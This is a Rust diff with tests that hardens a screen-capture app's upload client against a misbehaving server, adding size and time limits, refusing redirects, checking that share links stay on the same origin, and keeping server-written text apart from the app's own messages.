@@ -61,6 +61,35 @@ pub const HISTORY_EVENT: &str = "share:history";
 /// A file name sent with `init` is cut here (the server takes 200).
 const MAX_FILENAME: usize = 200;
 
+// ---- what the client accepts from the server ----
+//
+// The answers below decide how much work and memory an upload costs, so
+// none of them is taken on trust: a server that is not the one it should be
+// (a compromised socorin.com, an `http://` server behind a MITM, or simply
+// a wrong address in Settings) must not be able to hang the app, fill its
+// memory or put something of its choosing on the clipboard.
+
+/// Smallest chunk size worth using: without a floor a server could ask for
+/// one request per byte.
+const CHUNK_MIN: u64 = 256 * 1024;
+/// Largest chunk the client will hold in memory for one request.
+const CHUNK_MAX: u64 = 16 * 1024 * 1024;
+/// The client's own file-size ceiling, whatever `maxFileBytes` claims.
+pub const CLIENT_MAX_FILE: u64 = 25 * 1024 * 1024;
+/// No upload is allowed to become more requests than this.
+const MAX_CHUNKS: u64 = 256;
+/// The whole upload (limits, register, init, every chunk, complete) gives
+/// up after this, so a stalling server cannot leave "Uploading…" forever.
+const SESSION_DEADLINE: Duration = Duration::from_secs(600);
+/// The most of any response body that is read into memory. Every answer in
+/// this protocol is a short JSON object; a failure may be a proxy's HTML,
+/// which is only needed for its first bytes.
+const MAX_BODY: usize = 64 * 1024;
+/// A share link longer than this is not a link.
+const MAX_SHARE_URL: usize = 512;
+/// The server's own sentence is cut here before it is ever shown.
+const MAX_SERVER_MESSAGE: usize = 200;
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "lowercase")]
 pub enum Kind {
@@ -78,7 +107,17 @@ pub struct Limits {
     pub retention_days: u32,
 }
 
-/// The answer to a finished upload.
+impl Limits {
+    /// The size limit that actually applies: the server's, but never more
+    /// than the client is willing to read into memory and send.
+    pub fn effective_max(&self) -> u64 {
+        self.max_file_bytes.min(CLIENT_MAX_FILE)
+    }
+}
+
+/// The answer to a finished upload. Only `complete` answers with this; it
+/// carries the delete token, so it never leaves the Rust side (the pages
+/// and the history get a `PublicLink`).
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct ShareResult {
@@ -158,7 +197,13 @@ pub struct PublicLink {
 #[serde(rename_all = "camelCase")]
 pub struct ShareError {
     pub code: String,
+    /// The app's own sentence. Never contains anything the server wrote.
     pub message: String,
+    /// What the server said for itself, cleaned and cut (`server_message`).
+    /// The pages show it apart, under "The server said:", so a server
+    /// cannot put words in Socorin's mouth.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub server_message: Option<String>,
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub max_bytes: Option<u64>,
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -175,6 +220,7 @@ impl ShareError {
         Self {
             code: code.into(),
             message: message.into(),
+            server_message: None,
             max_bytes: None,
             retry_after_seconds: None,
             status: None,
@@ -237,6 +283,18 @@ pub fn megabytes(bytes: u64) -> String {
     }
 }
 
+/// "900 bytes", "256 KB", "16 MB": a size in a unit that stays readable,
+/// for the chunk sizes, which are far smaller than a capture.
+fn size_text(bytes: u64) -> String {
+    if bytes < 1024 {
+        format!("{bytes} bytes")
+    } else if bytes < 1024 * 1024 {
+        format!("{} KB", (bytes as f64 / 1024.0).round() as u64)
+    } else {
+        megabytes(bytes)
+    }
+}
+
 /// "45 seconds", "1 minute", "3 minutes".
 fn wait_time(seconds: u64) -> String {
     if seconds < 60 {
@@ -248,7 +306,7 @@ fn wait_time(seconds: u64) -> String {
 }
 
 /// The host the messages name ("socorin.com", "localhost:3000").
-fn host_of(server: &str) -> String {
+pub(crate) fn host_of(server: &str) -> String {
     url::Url::parse(server)
         .ok()
         .and_then(|u| {
@@ -287,6 +345,83 @@ pub fn now_secs() -> u64 {
     SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
 }
 
+// ---- what a share link may look like ----
+
+/// A link at all: an `http(s)` URL with a host, no credentials in it, no
+/// control characters or spaces (a newline would turn a paste into two
+/// clipboard lines, and into two shell commands) and not absurdly long.
+///
+/// This is what a remembered link has to pass to stay in the history:
+/// `shares.json` may hold links from a server that was configured earlier,
+/// and one of those should still be deletable, but a `javascript:` URL or
+/// one with a newline in it — planted in the file, or written by a version
+/// that did not check — is dropped.
+pub fn plausible_share_url(raw: &str) -> bool {
+    if raw.is_empty() || raw.len() > MAX_SHARE_URL {
+        return false;
+    }
+    if raw.chars().any(|c| c.is_control() || c.is_whitespace()) {
+        return false;
+    }
+    let Ok(url) = url::Url::parse(raw) else {
+        return false;
+    };
+    matches!(url.scheme(), "http" | "https")
+        && url.host_str().map_or(false, |h| !h.is_empty())
+        && url.username().is_empty()
+        && url.password().is_none()
+}
+
+/// The link a finished upload may answer with: plausible, and on the very
+/// server the capture was sent to. Same scheme, same host, same port — so
+/// a server cannot hand out a link to somewhere else (a phishing page, a
+/// look-alike domain) and have Socorin copy it to the clipboard as if it
+/// were its own.
+pub fn valid_share_url(server: &str, raw: &str) -> bool {
+    if !plausible_share_url(raw) {
+        return false;
+    }
+    let (Ok(url), Ok(base)) = (url::Url::parse(raw), url::Url::parse(server)) else {
+        return false;
+    };
+    url.scheme() == base.scheme()
+        && url.host_str() == base.host_str()
+        && url.port_or_known_default() == base.port_or_known_default()
+}
+
+/// When the server says it will drop the file, as unix seconds. `None` for
+/// a date that cannot be read (the format is the server's to change; an
+/// unreadable one must not silently delete the entry).
+fn expires_at_secs(expires_at: &str) -> Option<u64> {
+    chrono::DateTime::parse_from_rfc3339(expires_at.trim())
+        .ok()
+        .and_then(|t| u64::try_from(t.timestamp()).ok())
+}
+
+/// A link the server has already dropped is of no use to anyone.
+fn expired(expires_at: &str, now: u64) -> bool {
+    expires_at_secs(expires_at).map_or(false, |at| at <= now)
+}
+
+/// The server's own sentence, as far as it can be shown: one line, no
+/// control characters, cut at `MAX_SERVER_MESSAGE`. It is text the server
+/// wrote, so it is kept apart from the app's own words (`ShareError::
+/// server_message`) instead of being pasted into them.
+fn server_message(raw: &str) -> Option<String> {
+    let one_line: String = raw
+        .split_whitespace()
+        .filter(|w| !w.is_empty())
+        .collect::<Vec<_>>()
+        .join(" ")
+        .chars()
+        .filter(|c| !c.is_control())
+        .collect();
+    if one_line.is_empty() {
+        return None;
+    }
+    Some(one_line.chars().take(MAX_SERVER_MESSAGE).collect())
+}
+
 // ---- the failure vocabulary ----
 
 /// The error body the server sends; every field is optional because a
@@ -313,20 +448,23 @@ pub fn describe_failure(host: &str, status: u16, retry_after: Option<u64>, body:
             401 | 403 => "forbidden",
             404 => "session_not_found",
             400 | 422 => "invalid_request",
+            300..=399 => "server",
             500..=599 => "server",
             _ => "server",
         }
         .into()
     });
     let retry = parsed.retry_after_seconds.or(retry_after);
-    let server_says = parsed.message.filter(|m| !m.trim().is_empty());
-    let with_reason = |text: String| match &server_says {
-        Some(m) => format!("{text} ({m})"),
-        None => text,
-    };
+    let says = parsed.message.as_deref().and_then(server_message);
     let message = match code.as_str() {
         "file_too_large" => match parsed.max_bytes {
-            Some(max) => return ShareError { status: Some(status), ..ShareError::too_large(size, max) },
+            Some(max) => {
+                return ShareError {
+                    status: Some(status),
+                    server_message: says,
+                    ..ShareError::too_large(size, max)
+                }
+            }
             None => format!("This capture is {}, more than {host} accepts.", megabytes(size)),
         },
         "rate_limited" => match retry {
@@ -339,14 +477,20 @@ pub fn describe_failure(host: &str, status: u16, retry_after: Option<u64>, body:
         "chunk_invalid" | "chunk_missing" | "checksum_mismatch" => {
             format!("The upload arrived damaged at {host}. Try again.")
         }
-        "forbidden" | "blocked" => with_reason(format!("{host} refused this upload.")),
-        "invalid_request" => with_reason(format!("{host} rejected the request.")),
+        "forbidden" | "blocked" => format!("{host} refused this upload."),
+        "invalid_request" => format!("{host} rejected the request."),
+        // Redirects are not followed (the upload token and the capture
+        // itself would go to whatever host the answer names).
+        _ if (300..400).contains(&status) => {
+            format!("{host} redirected the upload somewhere else; Socorin does not follow that.")
+        }
         _ if status >= 500 => format!("{host} is not available right now (HTTP {status}). Try again later."),
-        _ => with_reason(format!("{host} answered HTTP {status}.")),
+        _ => format!("{host} answered HTTP {status}."),
     };
     ShareError {
         code,
         message,
+        server_message: says,
         max_bytes: parsed.max_bytes,
         retry_after_seconds: retry,
         status: Some(status),
@@ -379,6 +523,11 @@ impl Client {
         let http = reqwest::Client::builder()
             .user_agent(concat!("Socorin/", env!("CARGO_PKG_VERSION")))
             .timeout(REQUEST_TIMEOUT)
+            // Redirects are not followed: only `Authorization` is dropped
+            // when one crosses an origin, so `X-Socorin-Install` — and, on
+            // a 307/308, the capture itself — would travel to whatever
+            // host the answer names. A 3xx is a failure here.
+            .redirect(reqwest::redirect::Policy::none())
             .build()
             .map_err(|e| ShareError::new("client", e.to_string()))?;
         Ok(Self {
@@ -403,24 +552,50 @@ impl Client {
 
     /// Send, and turn anything but a 2xx into a `ShareError`. Returns the
     /// status and the body.
+    ///
+    /// At most `MAX_BODY` is ever read: every answer in this protocol is a
+    /// short JSON object, and a failure only needs its first bytes to be
+    /// described, so a server (or a MITM on an `http://` address) cannot
+    /// make the app swallow a body of its choosing.
     async fn send(&self, builder: reqwest::RequestBuilder, size: u64) -> Result<(u16, Vec<u8>), ShareError> {
-        let response = builder.send().await.map_err(|e| network_error(&self.host, &e))?;
+        let mut response = builder.send().await.map_err(|e| network_error(&self.host, &e))?;
         let status = response.status();
         let retry_after = response
             .headers()
             .get(reqwest::header::RETRY_AFTER)
             .and_then(|v| v.to_str().ok())
             .and_then(|v| v.trim().parse::<u64>().ok());
-        let body = response
-            .bytes()
-            .await
-            .map_err(|e| network_error(&self.host, &e))?
-            .to_vec();
-        if status.is_success() {
-            Ok((status.as_u16(), body))
-        } else {
-            Err(describe_failure(&self.host, status.as_u16(), retry_after, &body, size))
+        let fail = |body: &[u8]| describe_failure(&self.host, status.as_u16(), retry_after, body, size);
+        // An announced body past the cap is not read at all.
+        if response.content_length().map_or(false, |n| n > MAX_BODY as u64) {
+            return Err(if status.is_success() { self.too_much() } else { fail(b"") });
         }
+        let mut body: Vec<u8> = Vec::new();
+        let mut truncated = false;
+        while let Some(chunk) = response.chunk().await.map_err(|e| network_error(&self.host, &e))? {
+            let room = MAX_BODY - body.len();
+            if chunk.len() > room {
+                body.extend_from_slice(&chunk[..room]);
+                truncated = true;
+                break;
+            }
+            body.extend_from_slice(&chunk);
+        }
+        if !status.is_success() {
+            return Err(fail(&body));
+        }
+        if truncated {
+            return Err(self.too_much());
+        }
+        Ok((status.as_u16(), body))
+    }
+
+    /// A successful answer that does not fit the protocol's shape.
+    fn too_much(&self) -> ShareError {
+        ShareError::new(
+            "invalid_response",
+            format!("{} answered with far more data than an upload answer holds.", self.host),
+        )
     }
 
     fn json<T: serde::de::DeserializeOwned>(&self, body: &[u8], what: &str) -> Result<T, ShareError> {
@@ -467,7 +642,50 @@ async fn fetch_limits(client: &Client) -> Result<Limits, ShareError> {
     if limits.chunk_bytes == 0 || limits.max_file_bytes == 0 {
         return Err(ShareError::new("invalid_response", format!("{} reports no upload limits.", client.host)));
     }
+    check_chunk_bytes(client.host.as_str(), limits.chunk_bytes)?;
     Ok(limits)
+}
+
+/// A chunk size the client is willing to work with. Too small and one
+/// upload becomes thousands of requests (a 5 MB capture at one byte per
+/// chunk is over five million); too large and one request would have to
+/// hold more than the whole file is allowed to be.
+fn check_chunk_bytes(host: &str, chunk_bytes: u64) -> Result<(), ShareError> {
+    if !(CHUNK_MIN..=CHUNK_MAX).contains(&chunk_bytes) {
+        return Err(ShareError::new(
+            "invalid_response",
+            format!(
+                "{host} asks for chunks of {}; Socorin only sends chunks between {} and {}.",
+                size_text(chunk_bytes),
+                size_text(CHUNK_MIN),
+                size_text(CHUNK_MAX)
+            ),
+        ));
+    }
+    Ok(())
+}
+
+/// How many requests this upload becomes, once the server's `init` answer
+/// has been held against the client's own bounds: the chunk size is one the
+/// client sends, the count the server announces is the count the file
+/// really makes (a server answering `totalChunks: 0` used to skip this
+/// check altogether), and the whole upload stays under `MAX_CHUNKS`.
+fn chunk_count(host: &str, size: u64, chunk_bytes: u64, total_chunks: u64) -> Result<u64, ShareError> {
+    check_chunk_bytes(host, chunk_bytes)?;
+    let count = size.div_ceil(chunk_bytes).max(1);
+    if total_chunks != count {
+        return Err(ShareError::new(
+            "invalid_response",
+            format!("{host} expects {total_chunks} chunks, this file makes {count}."),
+        ));
+    }
+    if count > MAX_CHUNKS {
+        return Err(ShareError::new(
+            "invalid_response",
+            format!("{host} would split this capture into {count} requests; Socorin sends at most {MAX_CHUNKS}."),
+        ));
+    }
+    Ok(count)
 }
 
 /// The install id from the settings, or a fresh one from the server
@@ -492,23 +710,46 @@ async fn install_id<R: Runtime>(app: &AppHandle<R>, client: &Client) -> Result<S
     Ok(id)
 }
 
-/// Checks made before anything is sent: the type must be one the server
-/// takes and the size within its limit.
+/// Checks made before anything is read or sent: the type must be one the
+/// server takes and the size within the limit that applies — the server's,
+/// capped at `CLIENT_MAX_FILE`, so a server claiming a huge `maxFileBytes`
+/// cannot make the app read a recording of any size into memory.
 pub fn check(limits: &Limits, mime: &str, size: u64, host: &str) -> Result<(), ShareError> {
     if !limits.accepted_mimes.iter().any(|m| m.eq_ignore_ascii_case(mime)) {
         return Err(ShareError::new("unsupported_type", format!("{host} does not accept {mime} files.")));
     }
-    if size > limits.max_file_bytes {
-        return Err(ShareError::too_large(size, limits.max_file_bytes));
+    let max = limits.effective_max();
+    if size > max {
+        return Err(ShareError::too_large(size, max));
     }
     Ok(())
 }
 
-/// Upload `bytes` and return the link. The whole protocol, in order: the
-/// limits (cached), the install id (registered once), `init`, the chunks
-/// (each retried on network / server trouble), `complete`. The link is
-/// remembered in the history.
+/// Upload `bytes` and return the link, giving up after `SESSION_DEADLINE`
+/// however slowly the server answers, so "Uploading…" cannot last forever.
 pub async fn upload<R: Runtime>(
+    app: &AppHandle<R>,
+    bytes: Vec<u8>,
+    kind: Kind,
+    mime: &str,
+    filename: Option<String>,
+) -> Result<SharedLink, ShareError> {
+    let host = host_of(&settings::current(app).upload_server);
+    match tokio::time::timeout(SESSION_DEADLINE, upload_session(app, bytes, kind, mime, filename)).await {
+        Ok(result) => result,
+        Err(_) => Err(ShareError::new(
+            "network",
+            format!("The upload to {host} took longer than {}; it was given up on.", wait_time(SESSION_DEADLINE.as_secs())),
+        )),
+    }
+}
+
+/// The whole protocol, in order: the limits (cached), the install id
+/// (registered once), `init`, the chunks (each retried on network / server
+/// trouble), `complete`. Everything the server answers with is checked
+/// against the client's own bounds before it is acted on. The link is
+/// remembered in the history.
+async fn upload_session<R: Runtime>(
     app: &AppHandle<R>,
     bytes: Vec<u8>,
     kind: Kind,
@@ -536,18 +777,10 @@ pub async fn upload<R: Runtime>(
         .send(client.request(reqwest::Method::POST, "/api/upload/init").json(&init), size)
         .await?;
     let session: Initiated = client.json(&body, "init")?;
-    if session.chunk_bytes == 0 {
-        return Err(ShareError::new("invalid_response", format!("{} sent no chunk size.", client.host)));
-    }
+    chunk_count(&client.host, size, session.chunk_bytes, session.total_chunks)?;
 
     let chunk_bytes = session.chunk_bytes as usize;
     let chunks: Vec<&[u8]> = if bytes.is_empty() { vec![&bytes[..]] } else { bytes.chunks(chunk_bytes).collect() };
-    if session.total_chunks != 0 && session.total_chunks != chunks.len() as u64 {
-        return Err(ShareError::new(
-            "invalid_response",
-            format!("{} expects {} chunks, this file makes {}.", client.host, session.total_chunks, chunks.len()),
-        ));
-    }
     for (index, chunk) in chunks.iter().enumerate() {
         put_chunk(&client, &session, index, chunk, size).await?;
     }
@@ -561,6 +794,14 @@ pub async fn upload<R: Runtime>(
         )
         .await?;
     let result: ShareResult = client.json(&body, "complete")?;
+    // The link has to be one on the server this went to: nothing else may
+    // reach the clipboard, the popover or the history.
+    if !valid_share_url(&server, &result.share_url) {
+        return Err(ShareError::new(
+            "invalid_response",
+            format!("{} answered with a link that is not on {}; it was not copied.", client.host, client.host),
+        ));
+    }
     let link = SharedLink::from_result(result, now_secs());
     remember(app, &link);
     Ok(link)
@@ -618,12 +859,21 @@ fn history_file<R: Runtime>(app: &AppHandle<R>) -> Option<std::path::PathBuf> {
     settings::config_path(app, "shares.json")
 }
 
-/// The remembered links, newest first.
+/// The remembered links, newest first. A line that is not worth keeping is
+/// dropped as the file is read: one whose link is not a plausible URL (a
+/// file written by a version that did not check, or edited by hand), one
+/// the server has already dropped (`expires_at` in the past), and anything
+/// past `HISTORY_LIMIT`.
 pub fn history<R: Runtime>(app: &AppHandle<R>) -> Vec<SharedLink> {
+    let now = now_secs();
     history_file(app)
         .and_then(|p| std::fs::read_to_string(p).ok())
-        .and_then(|s| serde_json::from_str(&s).ok())
+        .and_then(|s| serde_json::from_str::<Vec<SharedLink>>(&s).ok())
         .unwrap_or_default()
+        .into_iter()
+        .filter(|l| plausible_share_url(&l.share_url) && !expired(&l.expires_at, now))
+        .take(HISTORY_LIMIT)
+        .collect()
 }
 
 fn save_history<R: Runtime>(app: &AppHandle<R>, links: &[SharedLink]) {
@@ -658,6 +908,26 @@ fn forget<R: Runtime>(app: &AppHandle<R>, id: &str) {
     }
 }
 
+/// Write the history back without the lines `history` no longer accepts, so
+/// the delete tokens of expired links do not sit in the file for ever.
+/// Called when the settings window asks for the list; a no-op once the file
+/// holds nothing stale.
+pub fn prune_history<R: Runtime>(app: &AppHandle<R>) {
+    let Some(path) = history_file(app) else {
+        return;
+    };
+    let Ok(text) = std::fs::read_to_string(&path) else {
+        return;
+    };
+    let Ok(stored) = serde_json::from_str::<Vec<SharedLink>>(&text) else {
+        return;
+    };
+    let kept = history(app);
+    if kept.len() != stored.len() {
+        save_history(app, &kept);
+    }
+}
+
 /// Put a remembered link on the clipboard again.
 pub fn copy_link<R: Runtime>(app: &AppHandle<R>, id: &str) -> Result<(), String> {
     let link = history(app)
@@ -687,8 +957,9 @@ pub fn copy_text<R: Runtime>(app: &AppHandle<R>, text: &str) -> Result<(), Strin
 
 /// Upload, copy the link and announce it: the whole "Upload & copy link"
 /// action for a PNG, from any page. The pages get the outcome back as
-/// well, for their own toast.
-pub async fn share_png<R: Runtime>(app: &AppHandle<R>, png: Vec<u8>) -> Result<ShareResult, ShareError> {
+/// well, for their own toast — as a `PublicLink`, so the delete token
+/// stays on the Rust side (deleting goes by id, `delete_share`).
+pub async fn share_png<R: Runtime>(app: &AppHandle<R>, png: Vec<u8>) -> Result<PublicLink, ShareError> {
     let name = format!("{}_{}.png", settings::current(app).file_prefix, crate::capture::time_stamp());
     let outcome = upload(app, png, Kind::Image, "image/png", Some(name)).await;
     announce(app, outcome)
@@ -697,7 +968,7 @@ pub async fn share_png<R: Runtime>(app: &AppHandle<R>, png: Vec<u8>) -> Result<S
 /// Copy the link and show the popover (or show the failure), and hand the
 /// outcome back for the caller. Copying can fail on its own; then the
 /// upload still happened and the popover offers the link.
-pub fn announce<R: Runtime>(app: &AppHandle<R>, outcome: Result<SharedLink, ShareError>) -> Result<ShareResult, ShareError> {
+pub fn announce<R: Runtime>(app: &AppHandle<R>, outcome: Result<SharedLink, ShareError>) -> Result<PublicLink, ShareError> {
     let notice = match &outcome {
         Ok(link) => {
             if let Err(e) = copy_text(app, &link.share_url) {
@@ -723,15 +994,7 @@ pub fn announce<R: Runtime>(app: &AppHandle<R>, outcome: Result<SharedLink, Shar
     if let Err(e) = windows::show_share_notice(app) {
         eprintln!("[share] {e}");
     }
-    outcome.map(|link| ShareResult {
-        id: link.id,
-        share_url: link.share_url,
-        delete_token: link.delete_token,
-        expires_at: link.expires_at,
-        kind: link.kind,
-        mime: link.mime,
-        size: link.size,
-    })
+    outcome.map(|link| link.public())
 }
 
 /// "After capture: upload" — the PNG goes up on a worker thread; the
@@ -783,6 +1046,14 @@ pub(crate) mod tests {
             Arc,
         },
     };
+
+    /// A chunk size the client is willing to use (`CHUNK_MIN` is the
+    /// floor, `CHUNK_MAX` the ceiling). Tests that only need a single
+    /// chunk take this and stay well under it; `MULTI_CHUNK_BYTES` is what
+    /// it takes to make several.
+    pub const TEST_CHUNK: u64 = CHUNK_MIN;
+    /// Three full chunks and a short one.
+    pub const MULTI_CHUNK_BYTES: usize = CHUNK_MIN as usize * 3 + 100;
 
     /// One request as the fake server saw it.
     #[derive(Debug, Clone)]
@@ -891,6 +1162,10 @@ pub(crate) mod tests {
     pub struct Fake {
         pub chunk_bytes: u64,
         pub max_bytes: u64,
+        /// Where `serve_fake` put it, so `complete` can answer with a link
+        /// on this very origin (the client refuses any other, see
+        /// `valid_share_url`).
+        pub base: Mutex<String>,
         pub fail_chunk: Option<(usize, u16)>,
         /// The failure answers like the real server (`{"error":"internal"}`)
         /// instead of like a proxy (HTML).
@@ -909,6 +1184,7 @@ pub(crate) mod tests {
             Arc::new(Self {
                 chunk_bytes,
                 max_bytes,
+                base: Mutex::new(String::new()),
                 fail_chunk: None,
                 fail_chunk_json: false,
                 log: Mutex::new(Vec::new()),
@@ -923,6 +1199,14 @@ pub(crate) mod tests {
 
         pub fn registrations(&self) -> u32 {
             self.registered.load(Ordering::SeqCst)
+        }
+
+        /// The link this server hands out: on its own origin, as the real
+        /// one does.
+        pub fn share_url(&self) -> String {
+            let base = self.base.lock().unwrap().clone();
+            let origin = if base.is_empty() { "https://socorin.com".to_string() } else { base };
+            format!("{origin}/s/{MEDIA_ID}")
         }
 
         pub fn deleted(&self) -> Vec<String> {
@@ -1029,8 +1313,8 @@ pub(crate) mod tests {
                     json(
                         201,
                         serde_json::json!({
-                            "id": "med-0123456789abcdefgh",
-                            "shareUrl": "https://socorin.com/s/med-0123456789abcdefgh",
+                            "id": MEDIA_ID,
+                            "shareUrl": self.share_url(),
                             "deleteToken": "del-".to_string() + &"x".repeat(39),
                             "expiresAt": "2026-11-17T00:00:00Z",
                             "kind": "image",
@@ -1056,9 +1340,16 @@ pub(crate) mod tests {
         }
     }
 
+    /// The id every `Fake` hands out for the uploaded media.
+    pub const MEDIA_ID: &str = "med-0123456789abcdefgh";
+
     pub fn serve_fake(fake: &Arc<Fake>) -> String {
-        let fake = fake.clone();
-        serve(move |req| fake.handle(req))
+        let handler = fake.clone();
+        let base = serve(move |req| handler.handle(req));
+        // Nothing has asked yet, so the link it will answer with can still
+        // be told where it lives.
+        *fake.base.lock().unwrap() = base.clone();
+        base
     }
 
     fn run<F: std::future::Future>(f: F) -> F::Output {
@@ -1151,11 +1442,13 @@ pub(crate) mod tests {
             assert!(e.message.contains("arrived damaged"), "{code}: {}", e.message);
         }
         let e = describe_failure(host, 403, None, br#"{"error":"blocked","message":"abuse"}"#, 1);
-        assert_eq!(e.message, "socorin.com refused this upload. (abuse)");
+        assert_eq!(e.message, "socorin.com refused this upload.");
+        assert_eq!(e.server_message.as_deref(), Some("abuse"), "kept apart from our own words");
         assert_eq!(describe_failure(host, 401, None, b"", 1).message, "socorin.com refused this upload.");
         assert_eq!(describe_failure(host, 404, None, b"", 1).code, "session_not_found");
         let e = describe_failure(host, 400, None, br#"{"error":"invalid_request","message":"bad mime"}"#, 1);
-        assert_eq!(e.message, "socorin.com rejected the request. (bad mime)");
+        assert_eq!(e.message, "socorin.com rejected the request.");
+        assert_eq!(e.server_message.as_deref(), Some("bad mime"));
         assert_eq!(describe_failure(host, 422, None, b"", 1).code, "invalid_request");
         let e = describe_failure(host, 502, None, b"<html>Bad gateway</html>", 1);
         assert_eq!((e.code.as_str(), e.status), ("server", Some(502)));
@@ -1172,7 +1465,8 @@ pub(crate) mod tests {
         assert_eq!(describe_failure(host, 413, None, br#"{"error":"file_too_large","maxBytes":1}"#, 2).status, Some(413));
         assert!(!describe_failure(host, 403, None, b"", 1).retryable());
         let e = describe_failure(host, 418, None, br#"{"error":"teapot","message":"short and stout"}"#, 1);
-        assert_eq!(e.message, "socorin.com answered HTTP 418. (short and stout)");
+        assert_eq!(e.message, "socorin.com answered HTTP 418.");
+        assert_eq!(e.server_message.as_deref(), Some("short and stout"));
         assert_eq!(describe_failure(host, 418, None, b"", 1).message, "socorin.com answered HTTP 418.");
         assert_eq!(describe_failure(host, 418, None, br#"{"error":""}"#, 1).code, "server");
     }
@@ -1203,8 +1497,9 @@ pub(crate) mod tests {
         let bytes = png(1000);
 
         let link = run(upload(&handle, bytes.clone(), Kind::Image, "image/png", Some("a.png".into()))).unwrap();
-        assert_eq!(link.share_url, "https://socorin.com/s/med-0123456789abcdefgh");
-        assert_eq!(link.id, "med-0123456789abcdefgh");
+        // The link is on the very server it went to, and nowhere else.
+        assert_eq!(link.share_url, format!("{base}/s/{MEDIA_ID}"));
+        assert_eq!(link.id, MEDIA_ID);
         assert_eq!(link.size, 1000);
         assert_eq!(link.kind, Kind::Image);
         assert!(link.created_at > 1_700_000_000);
@@ -1248,22 +1543,23 @@ pub(crate) mod tests {
 
     #[test]
     fn uploads_in_several_chunks_and_retries_a_failed_one() {
-        let mut fake = Fake::new(300, 5 * 1024 * 1024);
+        let mut fake = Fake::new(TEST_CHUNK, 5 * 1024 * 1024);
         Arc::get_mut(&mut fake).unwrap().fail_chunk = Some((1, 502));
         let base = serve_fake(&fake);
         let app = app_for(&base, "share-chunks");
         let handle = app.handle().clone();
-        let bytes = png(1000); // 4 chunks of 300, the last one 100
+        let bytes = png(MULTI_CHUNK_BYTES); // 4 chunks, the last one 100 bytes
 
         let link = run(upload(&handle, bytes.clone(), Kind::Image, "image/png", None)).unwrap();
-        assert_eq!(link.size, 1000);
+        assert_eq!(link.size, MULTI_CHUNK_BYTES as u64);
         let puts = fake.requests("PUT", "/api/upload/");
         // 4 chunks plus the repeat of chunk 1.
         assert_eq!(puts.len(), 5);
         let indexes: Vec<&str> = puts.iter().map(|p| p.path.rsplit('/').next().unwrap()).collect();
         assert_eq!(indexes, ["0", "1", "1", "2", "3"]);
-        assert_eq!(puts[0].body, &bytes[..300]);
-        assert_eq!(puts[4].body, &bytes[900..]);
+        let chunk = TEST_CHUNK as usize;
+        assert_eq!(puts[0].body, &bytes[..chunk]);
+        assert_eq!(puts[4].body, &bytes[chunk * 3..]);
         assert_eq!(puts[4].header("Content-Length"), Some("100"));
     }
 
@@ -1271,7 +1567,7 @@ pub(crate) mod tests {
     /// chunk is still sent again.
     #[test]
     fn a_chunk_answered_with_the_servers_own_500_is_retried_too() {
-        let mut fake = Fake::new(300, 5 * 1024 * 1024);
+        let mut fake = Fake::new(TEST_CHUNK, 5 * 1024 * 1024);
         {
             let f = Arc::get_mut(&mut fake).unwrap();
             f.fail_chunk = Some((0, 500));
@@ -1279,9 +1575,9 @@ pub(crate) mod tests {
         }
         let base = serve_fake(&fake);
         let app = app_for(&base, "share-500-json");
-        let bytes = png(1000);
+        let bytes = png(MULTI_CHUNK_BYTES);
         let link = run(upload(app.handle(), bytes.clone(), Kind::Image, "image/png", None)).unwrap();
-        assert_eq!(link.size, 1000);
+        assert_eq!(link.size, MULTI_CHUNK_BYTES as u64);
         let puts = fake.requests("PUT", "/api/upload/");
         assert_eq!(puts.len(), 5);
         let indexes: Vec<&str> = puts.iter().map(|p| p.path.rsplit('/').next().unwrap()).collect();
@@ -1292,7 +1588,7 @@ pub(crate) mod tests {
 
     #[test]
     fn a_chunk_refused_by_the_server_is_not_retried() {
-        let mut fake = Fake::new(300, 5 * 1024 * 1024);
+        let mut fake = Fake::new(TEST_CHUNK, 5 * 1024 * 1024);
         Arc::get_mut(&mut fake).unwrap().fail_chunk = Some((0, 403));
         let base = serve_fake(&fake);
         let app = app_for(&base, "share-4xx");
@@ -1311,7 +1607,7 @@ pub(crate) mod tests {
                 counter.fetch_add(1, Ordering::SeqCst);
                 return Resp { status: 503, headers: vec![], body: b"unavailable".to_vec() };
             }
-            Fake::new(100, 1000).handle(req)
+            Fake::new(TEST_CHUNK, 1000).handle(req)
         });
         let app = app_for(&base, "share-503");
         let handle = app.handle().clone();
@@ -1328,7 +1624,7 @@ pub(crate) mod tests {
                 counter.fetch_add(1, Ordering::SeqCst);
                 return json(500, serde_json::json!({ "error": "internal", "message": "Internal server error" }));
             }
-            Fake::new(100, 1000).handle(req)
+            Fake::new(TEST_CHUNK, 1000).handle(req)
         });
         point_at(&handle, &base);
         let e = run(upload(&handle, png(50), Kind::Image, "image/png", None)).unwrap_err();
@@ -1340,7 +1636,7 @@ pub(crate) mod tests {
 
     #[test]
     fn too_large_files_never_reach_init_and_a_413_is_understood_too() {
-        let fake = Fake::new(1000, 500);
+        let fake = Fake::new(TEST_CHUNK, 500);
         let base = serve_fake(&fake);
         let app = app_for(&base, "share-large");
         let handle = app.handle().clone();
@@ -1351,7 +1647,7 @@ pub(crate) mod tests {
         assert_eq!(fake.registrations(), 0, "nothing is registered for a file that cannot go");
 
         // The server disagrees with its own limits: its 413 is read.
-        let fake2 = Fake::new(1000, 5000);
+        let fake2 = Fake::new(TEST_CHUNK, 5000);
         let base2 = serve(move |req| {
             if req.path == "/api/upload/init" {
                 return json(413, serde_json::json!({ "error": "file_too_large", "maxBytes": 100 }));
@@ -1370,7 +1666,7 @@ pub(crate) mod tests {
     #[test]
     fn rate_limits_and_unreachable_servers_are_reported() {
         let base = serve(|req| match req.path.as_str() {
-            "/api/upload/limits" => Fake::new(100, 1000).handle(req),
+            "/api/upload/limits" => Fake::new(TEST_CHUNK, 1000).handle(req),
             "/api/app/register" => Resp {
                 status: 429,
                 headers: vec![("Retry-After".into(), "45".into())],
@@ -1425,7 +1721,7 @@ pub(crate) mod tests {
 
         // Registration answers with a bad id.
         let base = serve(|req| match req.path.as_str() {
-            "/api/upload/limits" => Fake::new(100, 1000).handle(req),
+            "/api/upload/limits" => Fake::new(TEST_CHUNK, 1000).handle(req),
             "/api/app/register" => json(201, serde_json::json!({ "installId": "bad id!" })),
